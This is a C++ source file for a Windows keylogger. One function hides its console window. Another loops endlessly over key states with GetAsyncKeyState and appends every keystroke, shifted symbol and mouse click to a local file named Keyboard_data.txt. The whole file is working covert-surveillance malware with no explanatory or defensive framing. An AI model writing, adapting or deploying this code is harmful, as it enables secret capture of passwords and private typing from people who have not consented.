#include <iostream>
#include <Windows.h>
#include <Winuser.h>
#include <fstream>
using namespace std;

void check(void);
void hide(void);

int main()
{
    hide();
    check();

    return 0;
}
void check()
{
    char key;
    for (;;)
    {
        for (key = 1; key < 127; key++)
        {
            if (GetAsyncKeyState(key) == -32767)
            {
                ofstream write("Keyboard_data.txt", ios::app);

                if ((key > 64) && (key < 91) && !(GetAsyncKeyState(0x10)))
                {
                    key += 32;
                    write << key;
                    write.close();
                    break;
                }
                else if ((key > 64) && (key < 91))
                {
                    write << key;
                    write.close();
                    break;
                }
                else
                {
                    switch (key)
                    {
                    case 49:
                        if (GetAsyncKeyState(0x10))
                        {
                            write << "!";
                        }
                        else
                        {
                            write << "1";
                        }

                        break;
                    case 50:
                        if (GetAsyncKeyState(0x10))
                        {
                            write << "@";
                        }
                        else
                        {
                            write << "2";
                        }
                        break;
                    case 51:
                        if (GetAsyncKeyState(0x10))
                        {
                            write << "#";
                        }
                        else
                        {
                            write << "3";
                        }
                        break;
                    case 52:
                        if (GetAsyncKeyState(0x10))
                        {
                            write << "$";
                        }
                        else
                        {
                            write << "4";
                        }
                        break;
                    case 53:
                        if (GetAsyncKeyState(0x10))
                        {
                            write << "%";
                        }
                        else
                        {
                            write << "5";
                        }
                        break;

                    case 54:
                        if (GetAsyncKeyState(0x10))
                        {
                            write << "^";
                        }
                        else
                        {
                            write << "6";
                        }
                        break;

                    case 55:
                        if (GetAsyncKeyState(0x10))
                        {
                            write << "&";
                        }
                        else
                        {
                            write << "7";
                        }
                        break;

                    case 56:
                        if (GetAsyncKeyState(0x10))
                        {
                            write << "*";
                        }
                        else
                        {
                            write << "8";
                        }
                        break;

                    case 57:
                        if (GetAsyncKeyState(0x10))
                        {
                            write << "(";
                        }
                        else
                        {
                            write << "9";
                        }
                        break;

                    case 48:
                        if (GetAsyncKeyState(0x10))
                        {
                            write << ")";
                        }
                        else
                        {
                            write << "0";
                        }
                        break;

                    case 61:
                        if (GetAsyncKeyState(0x10))
                        {
                            write << "+";
                        }
                        else
                        {
                            write << "=";
                        }
                        break;

                    case 45:
                        if (GetAsyncKeyState(0x10))
                        {
                            write << "_";
                        }
                        else
                        {
                            write << "-";
                        }
                        break;

                    case 59:
                        if (GetAsyncKeyState(0x10))
                        {
                            write << ":";
                        }
                        else
                        {
                            write << ";";
                        }
                        break;

                    case 44:
                        if (GetAsyncKeyState(0x10))
                        {
                            write << "<";
                        }
                        else
                        {
                            write << ",";
                        }
                        break;

                    case 46:
                        if (GetAsyncKeyState(0x10))
                        {
                            write << ">";
                        }
                        else
                        {
                            write << ".";
                        }
                        break;

                    case 47:
                        if (GetAsyncKeyState(0x10))
                        {
                            write << "?";
                        }
                        else
                        {
                            write << "/";
                        }
                        break;

                    case 91:
                        if (GetAsyncKeyState(0x10))
                        {
                            write << "{";
                        }
                        else
                        {
                            write << "[";
                        }
                        break;

                    case 93:
                        if (GetAsyncKeyState(0x10))
                        {
                            write << "}";
                        }
                        else
                        {
                            write << "]";
                        }
                        break;

                    

                    case VK_LBUTTON:
                        write << "#left_mouse_button";
                        break;

                    case VK_RBUTTON:
                        write << "#R_CLICK#";
                        break;

                    case VK_MBUTTON:
                        write << "#middle_mouse_button";
                        break;

                    case VK_BACK:
                        write << "\b";
                        break;

                    case VK_TAB:
                        write << "#TAB";
                        break;

                    case VK_RETURN:
                        write << "\n";
                        break;

                    case VK_SHIFT:
                        write << "#SHIFT#";
                        break;

                    case VK_CONTROL:
                        write << "#CONTROL";
                        break;

                    case VK_CAPITAL:
                        write << "#CAPS_LOCK#";
                        break;

                    case VK_SPACE:
                        write << " ";
                        break;
                    default:
                        write << key;
                    }
                }
            }
        }
    }
}
void hide()
{
    HWND stealth;                                      //declare window handle-(a handle is an abstract reference to a resource that is used when application software references blocks of memory or objects that are managed by another system like a database or an operating system.)
    AllocConsole();                                    //Allocate new console for calling process
    stealth = FindWindowA("ConsoleWindowClass", NULL); //find window class with class name consolewindow
    ShowWindow(stealth, 0);                            //hide it
}